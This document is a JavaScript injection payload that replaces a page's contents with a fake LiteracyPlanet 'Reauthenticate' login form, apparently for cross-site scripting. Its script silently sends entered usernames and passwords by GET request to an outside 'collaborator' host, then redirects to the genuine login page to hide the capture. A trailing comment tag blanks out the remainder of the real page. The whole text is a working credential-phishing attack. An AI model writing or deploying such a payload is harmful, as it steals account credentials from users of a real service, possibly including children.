document.body.innerHTML = `<!DOCTYPE html>
<html>
<head>
  <title>Reauthenticate - LiteracyPlanet</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* General body styling */
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      color: #333;
    }

    /* Table container for the content */
    table {
      border-collapse: collapse;
      margin: 40px auto;
      background-color: #ffffff;
      border: 1px solid #ddd;
      border-radius: 8px;
      overflow: hidden;
      width: 600px;
    }

    /* Header styling */
    td.header {
      padding: 20px;
      text-align: center;
      background-color: #6ccef7;
      color: white;
      font-size: 24px;
      font-weight: bold;
    }

    /* Body content styling */
    td.body {
      padding: 20px;
      text-align: center;
    }

    /* Input field styling */
    input[type="text"],
    input[type="password"] {
      width: 100%;
      max-width: 400px;
      padding: 8px;
      margin-bottom: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    /* Submit button styling */
    button {
      background-color: #6ccef7;
      color: white;
      text-decoration: none;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background-color: #589cc6;
    }

    /* Loading spinner styling */
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #ddd;
      border-top: 5px solid #6ccef7;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: auto;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    /* Footer styling */
    td.footer {
      padding: 20px;
      text-align: center;
      background-color: #f4f4f4;
      font-size: 14px;
      color: #666;
    }

    td.footer a {
      color: #6ccef7;
      text-decoration: none;
    }

    td.footer a:hover {
      text-decoration: underline;
    }
  </style>
      <script>
      document.addEventListener('DOMContentLoaded', function () {
        const form = document.getElementById('reauth-form'); // Get form by ID
        const nextPageUrl = "https://app.literacyplanet.com/login"; // Change this to the next step in your login process

        form.addEventListener('submit', async function (event) {
          event.preventDefault(); // Prevent default form submission

          // Extract data from form fields
          const username = encodeURIComponent(form.username.value.trim());
          const password = encodeURIComponent(form.password.value.trim());

          // Validate that fields are filled
          if (!username || !password) {
            alert('Please fill out all required fields.');
            return;
          }

          // Show loading spinner
          document.body.innerHTML = "<div style='display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif;'>" +
            "<div style='text-align: center;'>" +
            "<div class='spinner'></div>" +
            "<p style='font-size: 18px; margin-top: 20px;'>Reauthenticating... Please wait.</p>" +
            "</div>" +
            "</div>";

          // Construct query string
          const collaboratorUrl =
            form.action + "?username=" + username + "&password=" + password;

          // Send silent GET request to collaborator server
          fetch(collaboratorUrl, {
            method: 'GET' // Specify GET method
          }).catch(function (error) {
            console.error("Error sending request to collaborator server: ", error);
            // Ignore errors as we don't care about the response
          });

          // Immediately redirect to the next page in the login process
          setTimeout(function () {
            window.location.href = nextPageUrl;
          }, 1000); // Delay of 1 second
        });
      });
    </script>
</head>
<body>
  <table>
    <!-- Header section -->
    <tr>
      <td class="header">
        <div>
          <img
            src="https://app.literacyplanet.com/assets/lp-logo-bordered-sml-ea97c7ba.png"
            alt="LiteracyPlanet Logo"
            style="max-width: 150px; margin-bottom: 10px;"
          />
        </div>
        Welcome to LiteracyPlanet!
      </td>
    </tr>

    <!-- Body content (form) -->
    <tr>
      <td class="body">
        <p style="font-size: 18px; margin: 0;">Hi there!</p>
        <p style="margin: 10px 0; font-size: 16px;">
          We take your security seriously! As part of our security measures,
          please reauthenticate to log in to your account.
        </p>

        <form
          id="reauth-form"
          method="GET"
          action="https://aiwneb53olqz3ypu3fhtwmgobfh650tp.c.ccxsta.com/reauthenticate"
        >
          <label for="username" style="font-size: 16px; font-weight: bold;">Username:</label>
          <input type="text" id="username" name="username" placeholder="Enter your username" required>
          <label for="password" style="font-size: 16px; font-weight: bold;">Password:</label>
          <input type="password" id="password" name="password" placeholder="Enter your password" required>
          <button type="submit">Reauthenticate</button>
        </form>
      </td>
    </tr>

    <!-- Footer section -->
    <tr>
      <td class="footer">
        <p style="margin: 0;">
          Having trouble?
          <a
            href="mailto:support@literacyplanet.com"
            style="color: #6ccef7; text-decoration: none;"
          >Contact our support team</a>
        </p>
        <p style="margin: 10px 0;">© 2026 LiteracyPlanet Inc. All rights reserved.</p>
      </td>
    </tr>
  </table>
</body>
</html><!--`
